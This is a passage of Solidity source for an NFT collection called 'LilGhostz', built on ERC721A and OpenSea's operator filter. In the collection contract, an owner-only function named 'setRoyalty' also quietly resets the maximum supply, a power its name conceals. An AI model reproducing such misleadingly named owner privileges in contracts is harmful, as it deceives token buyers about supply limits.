1046             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1047 
1048             // Updates:
1049             // - `address` to the owner.
1050             // - `startTimestamp` to the timestamp of minting.
1051             // - `burned` to `false`.
1052             // - `nextInitialized` to `quantity == 1`.
1053             _packedOwnerships[startTokenId] = _packOwnershipData(
1054                 to,
1055                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1056             );
1057 
1058             uint256 toMasked;
1059             uint256 end = startTokenId + quantity;
1060 
1061             // Use assembly to loop and emit the `Transfer` event for gas savings.
1062             // The duplicated `log4` removes an extra check and reduces stack juggling.
1063             // The assembly, together with the surrounding Solidity code, have been
1064             // delicately arranged to nudge the compiler into producing optimized opcodes.
1065             assembly {
1066                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1067                 toMasked := and(to, _BITMASK_ADDRESS)
1068                 // Emit the `Transfer` event.
1069                 log4(
1070                     0, // Start of data (0, since no data).
1071                     0, // End of data (0, since no data).
1072                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1073                     0, // `address(0)`.
1074                     toMasked, // `to`.
1075                     startTokenId // `tokenId`.
1076                 )
1077 
1078                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1079                 // that overflows uint256 will make the loop run out of gas.
1080                 // The compiler will optimize the `iszero` away for performance.
1081                 for {
1082                     let tokenId := add(startTokenId, 1)
1083                 } iszero(eq(tokenId, end)) {
1084                     tokenId := add(tokenId, 1)
1085                 } {
1086                     // Emit the `Transfer` event. Similar to above.
1087                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1088                 }
1089             }
1090             if (toMasked == 0) revert MintToZeroAddress();
1091 
1092             _currentIndex = end;
1093         }
1094         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1095     }
1096 
1097     /**
1098      * @dev Mints `quantity` tokens and transfers them to `to`.
1099      *
1100      * This function is intended for efficient minting only during contract creation.
1101      *
1102      * It emits only one {ConsecutiveTransfer} as defined in
1103      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1104      * instead of a sequence of {Transfer} event(s).
1105      *
1106      * Calling this function outside of contract creation WILL make your contract
1107      * non-compliant with the ERC721 standard.
1108      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1109      * {ConsecutiveTransfer} event is only permissible during contract creation.
1110      *
1111      * Requirements:
1112      *
1113      * - `to` cannot be the zero address.
1114      * - `quantity` must be greater than 0.
1115      *
1116      * Emits a {ConsecutiveTransfer} event.
1117      */
1118     function _mintERC2309(address to, uint256 quantity) internal virtual {
1119         uint256 startTokenId = _currentIndex;
1120         if (to == address(0)) revert MintToZeroAddress();
1121         if (quantity == 0) revert MintZeroQuantity();
1122         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1123 
1124         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1125 
1126         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1127         unchecked {
1128             // Updates:
1129             // - `balance += quantity`.
1130             // - `numberMinted += quantity`.
1131             //
1132             // We can directly add to the `balance` and `numberMinted`.
1133             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1134 
1135             // Updates:
1136             // - `address` to the owner.
1137             // - `startTimestamp` to the timestamp of minting.
1138             // - `burned` to `false`.
1139             // - `nextInitialized` to `quantity == 1`.
1140             _packedOwnerships[startTokenId] = _packOwnershipData(
1141                 to,
1142                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1143             );
1144 
1145             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1146 
1147             _currentIndex = startTokenId + quantity;
1148         }
1149         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1150     }
1151 
1152     /**
1153      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1154      *
1155      * Requirements:
1156      *
1157      * - If `to` refers to a smart contract, it must implement
1158      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1159      * - `quantity` must be greater than 0.
1160      *
1161      * See {_mint}.
1162      *
1163      * Emits a {Transfer} event for each mint.
1164      */
1165     function _safeMint(
1166         address to,
1167         uint256 quantity,
1168         bytes memory _data
1169     ) internal virtual {
1170         _mint(to, quantity);
1171 
1172         unchecked {
1173             if (to.code.length != 0) {
1174                 uint256 end = _currentIndex;
1175                 uint256 index = end - quantity;
1176                 do {
1177                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1178                         revert TransferToNonERC721ReceiverImplementer();
1179                     }
1180                 } while (index < end);
1181                 // Reentrancy protection.
1182                 if (_currentIndex != end) revert();
1183             }
1184         }
1185     }
1186 
1187     /**
1188      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1189      */
1190     function _safeMint(address to, uint256 quantity) internal virtual {
1191         _safeMint(to, quantity, '');
1192     }
1193 
1194     // =============================================================
1195     //                        BURN OPERATIONS
1196     // =============================================================
1197 
1198     /**
1199      * @dev Equivalent to `_burn(tokenId, false)`.
1200      */
1201     function _burn(uint256 tokenId) internal virtual {
1202         _burn(tokenId, false);
1203     }
1204 
1205     /**
1206      * @dev Destroys `tokenId`.
1207      * The approval is cleared when the token is burned.
1208      *
1209      * Requirements:
1210      *
1211      * - `tokenId` must exist.
1212      *
1213      * Emits a {Transfer} event.
1214      */
1215     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1216         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1217 
1218         address from = address(uint160(prevOwnershipPacked));
1219 
1220         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1221 
1222         if (approvalCheck) {
1223             // The nested ifs save around 20+ gas over a compound boolean condition.
1224             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1225                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1226         }
1227 
1228         _beforeTokenTransfers(from, address(0), tokenId, 1);
1229 
1230         // Clear approvals from the previous owner.
1231         assembly {
1232             if approvedAddress {
1233                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1234                 sstore(approvedAddressSlot, 0)
1235             }
1236         }
1237 
1238         // Underflow of the sender's balance is impossible because we check for
1239         // ownership above and the recipient's balance can't realistically overflow.
1240         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1241         unchecked {
1242             // Updates:
1243             // - `balance -= 1`.
1244             // - `numberBurned += 1`.
1245             //
1246             // We can directly decrement the balance, and increment the number burned.
1247             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1248             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1249 
1250             // Updates:
1251             // - `address` to the last owner.
1252             // - `startTimestamp` to the timestamp of burning.
1253             // - `burned` to `true`.
1254             // - `nextInitialized` to `true`.
1255             _packedOwnerships[tokenId] = _packOwnershipData(
1256                 from,
1257                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1258             );
1259 
1260             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1261             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1262                 uint256 nextTokenId = tokenId + 1;
1263                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1264                 if (_packedOwnerships[nextTokenId] == 0) {
1265                     // If the next slot is within bounds.
1266                     if (nextTokenId != _currentIndex) {
1267                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1268                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1269                     }
1270                 }
1271             }
1272         }
1273 
1274         emit Transfer(from, address(0), tokenId);
1275         _afterTokenTransfers(from, address(0), tokenId, 1);
1276 
1277         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1278         unchecked {
1279             _burnCounter++;
1280         }
1281     }
1282 
1283     // =============================================================
1284     //                     EXTRA DATA OPERATIONS
1285     // =============================================================
1286 
1287     /**
1288      * @dev Directly sets the extra data for the ownership data `index`.
1289      */
1290     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1291         uint256 packed = _packedOwnerships[index];
1292         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1293         uint256 extraDataCasted;
1294         // Cast `extraData` with assembly to avoid redundant masking.
1295         assembly {
1296             extraDataCasted := extraData
1297         }
1298         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1299         _packedOwnerships[index] = packed;
1300     }
1301 
1302     /**
1303      * @dev Called during each token transfer to set the 24bit `extraData` field.
1304      * Intended to be overridden by the cosumer contract.
1305      *
1306      * `previousExtraData` - the value of `extraData` before transfer.
1307      *
1308      * Calling conditions:
1309      *
1310      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1311      * transferred to `to`.
1312      * - When `from` is zero, `tokenId` will be minted for `to`.
1313      * - When `to` is zero, `tokenId` will be burned by `from`.
1314      * - `from` and `to` are never both zero.
1315      */
1316     function _extraData(
1317         address from,
1318         address to,
1319         uint24 previousExtraData
1320     ) internal view virtual returns (uint24) {}
1321 
1322     /**
1323      * @dev Returns the next extra data for the packed ownership data.
1324      * The returned result is shifted into position.
1325      */
1326     function _nextExtraData(
1327         address from,
1328         address to,
1329         uint256 prevOwnershipPacked
1330     ) private view returns (uint256) {
1331         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1332         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1333     }
1334 
1335     // =============================================================
1336     //                       OTHER OPERATIONS
1337     // =============================================================
1338 
1339     /**
1340      * @dev Returns the message sender (defaults to `msg.sender`).
1341      *
1342      * If you are writing GSN compatible contracts, you need to override this function.
1343      */
1344     function _msgSenderERC721A() internal view virtual returns (address) {
1345         return msg.sender;
1346     }
1347 
1348     /**
1349      * @dev Converts a uint256 to its ASCII string decimal representation.
1350      */
1351     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1352         assembly {
1353             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1354             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1355             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1356             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1357             let m := add(mload(0x40), 0xa0)
1358             // Update the free memory pointer to allocate.
1359             mstore(0x40, m)
1360             // Assign the `str` to the end.
1361             str := sub(m, 0x20)
1362             // Zeroize the slot after the string.
1363             mstore(str, 0)
1364 
1365             // Cache the end of the memory to calculate the length later.
1366             let end := str
1367 
1368             // We write the string from rightmost digit to leftmost digit.
1369             // The following is essentially a do-while loop that also handles the zero case.
1370             // prettier-ignore
1371             for { let temp := value } 1 {} {
1372                 str := sub(str, 1)
1373                 // Write the character to the pointer.
1374                 // The ASCII index of the '0' character is 48.
1375                 mstore8(str, add(48, mod(temp, 10)))
1376                 // Keep dividing `temp` until zero.
1377                 temp := div(temp, 10)
1378                 // prettier-ignore
1379                 if iszero(temp) { break }
1380             }
1381 
1382             let length := sub(end, str)
1383             // Move the pointer 32 bytes leftwards to make room for the length.
1384             str := sub(str, 0x20)
1385             // Store the length.
1386             mstore(str, length)
1387         }
1388     }
1389 }
1390 
1391 
1392 interface IOperatorFilterRegistry {
1393     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1394     function register(address registrant) external;
1395     function registerAndSubscribe(address registrant, address subscription) external;
1396     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1397     function unregister(address addr) external;
1398     function updateOperator(address registrant, address operator, bool filtered) external;
1399     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1400     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1401     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1402     function subscribe(address registrant, address registrantToSubscribe) external;
1403     function unsubscribe(address registrant, bool copyExistingEntries) external;
1404     function subscriptionOf(address addr) external returns (address registrant);
1405     function subscribers(address registrant) external returns (address[] memory);
1406     function subscriberAt(address registrant, uint256 index) external returns (address);
1407     function copyEntriesOf(address registrant, address registrantToCopy) external;
1408     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1409     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1410     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1411     function filteredOperators(address addr) external returns (address[] memory);
1412     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1413     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1414     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1415     function isRegistered(address addr) external returns (bool);
1416     function codeHashOf(address addr) external returns (bytes32);
1417 }
1418 
1419 
1420 /**
1421  * @title  OperatorFilterer
1422  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1423  *         registrant's entries in the OperatorFilterRegistry.
1424  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1425  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1426  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1427  */
1428 abstract contract OperatorFilterer {
1429     error OperatorNotAllowed(address operator);
1430 
1431     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1432         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1433 
1434     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1435         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1436         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1437         // order for the modifier to filter addresses.
1438         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1439             if (subscribe) {
1440                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1441             } else {
1442                 if (subscriptionOrRegistrantToCopy != address(0)) {
1443                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1444                 } else {
1445                     OPERATOR_FILTER_REGISTRY.register(address(this));
1446                 }
1447             }
1448         }
1449     }
1450 
1451     modifier onlyAllowedOperator(address from) virtual {
1452         // Check registry code length to facilitate testing in environments without a deployed registry.
1453         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1454             // Allow spending tokens from addresses with balance
1455             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1456             // from an EOA.
1457             if (from == msg.sender) {
1458                 _;
1459                 return;
1460             }
1461             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1462                 revert OperatorNotAllowed(msg.sender);
1463             }
1464         }
1465         _;
1466     }
1467 
1468     modifier onlyAllowedOperatorApproval(address operator) virtual {
1469         // Check registry code length to facilitate testing in environments without a deployed registry.
1470         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1471             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1472                 revert OperatorNotAllowed(operator);
1473             }
1474         }
1475         _;
1476     }
1477 }
1478 
1479 /**
1480  * @title  DefaultOperatorFilterer
1481  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1482  */
1483 abstract contract DefaultOperatorFilterer is OperatorFilterer {
1484     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1485     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1486 }
1487 
1488 contract LilGhostz is ERC721A, DefaultOperatorFilterer {
1489     uint256 public maxSupply = 777; 
1490     uint256 price = 0.002 ether; 
1491     mapping(uint256 => uint256) blockFree; 
1492 
1493     address owner;
1494     modifier onlyOwner {
1495         require(owner == msg.sender);
1496         _;
1497     }
1498     
1499     constructor() ERC721A("LilGhostz", "LGZ") {
1500         owner = msg.sender;
1501     }
1502 
1503     function mint(uint256 amount) payable public {
1504         require(totalSupply() + amount <= maxSupply);
1505         _mint(amount);
1506     }
1507 
1508     //save gas
1509     function _mint(uint256 amount) internal {
1510         if (msg.value == 0) {
1511             uint256 t = totalSupply();
1512             if (t > maxSupply / 3) {
1513                 require(balanceOf(msg.sender) == 0);
1514                 uint256 freeNum = (maxSupply - t) / 12;
1515                 require(blockFree[block.number] < freeNum);
1516                 blockFree[block.number]++;
1517             }
1518             _safeMint(msg.sender, 1);
1519             return;
1520         }
1521         require(msg.value >= amount * price);
1522         _safeMint(msg.sender, amount);
1523     }
1524 
1525     function teamMint(uint16 _mintAmount, address _addr) external onlyOwner {
1526         require(totalSupply() + _mintAmount <= maxSupply, "Exceeds max supply.");
1527         _safeMint(_addr, _mintAmount);
1528     }
1529 
1530     uint256 royalty = 50; 
1531     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1532         uint256 royaltyAmount = (_salePrice * royalty) / 1000;
1533         return (owner, royaltyAmount);
1534     }
1535 
1536     function tokenURI(uint256 tokenId) public pure override returns (string memory) {
1537         return string(abi.encodePacked("ipfs://QmcxpGbJx19sALeqxhpn1UPWkooyLZfkHhnYf6VuUcy57P/", _toString(tokenId), ".json"));
1538     }
1539 
1540     function withdraw() external onlyOwner {
1541         payable(msg.sender).transfer(address(this).balance);
1542     }
1543 
1544     function setRoyalty(uint256 r, uint256 s) external onlyOwner {
1545         royalty = r;
1546         maxSupply = s;
1547     }
1548 
1549     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1550         super.setApprovalForAll(operator, approved);
1551     }
1552 
1553     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1554         super.approve(operator, tokenId);
1555     }
1556 
1557     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1558         super.transferFrom(from, to, tokenId);
1559     }
1560 
1561     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1562         super.safeTransferFrom(from, to, tokenId);
1563     }
1564 
1565     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1566         public
1567         payable
1568         override
1569         onlyAllowedOperator(from)
1570     {
1571         super.safeTransferFrom(from, to, tokenId, data);
1572     }
1573 }